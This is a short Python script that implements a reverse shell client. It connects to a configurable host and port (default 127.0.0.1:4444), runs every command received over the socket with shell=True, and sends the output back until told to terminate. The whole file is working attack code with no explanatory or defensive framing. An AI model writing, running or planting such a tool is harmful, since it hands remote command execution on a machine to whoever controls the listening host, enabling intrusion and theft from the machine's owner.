import socket, click, subprocess


@click.command()
@click.option('--host', default='127.0.0.1')
@click.option('--port', default=4444)
def connect(host, port):
    s = socket.socket()
    s.connect((host, port))
    while True:
        command = s.recv(1024)
        if 'terminate' in command.decode():
            s.close()
            break
        else:
            CMD = subprocess.Popen(command.decode(), shell = True, stdout = subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())

    s.close()


if __name__ == '__main__':
    connect()
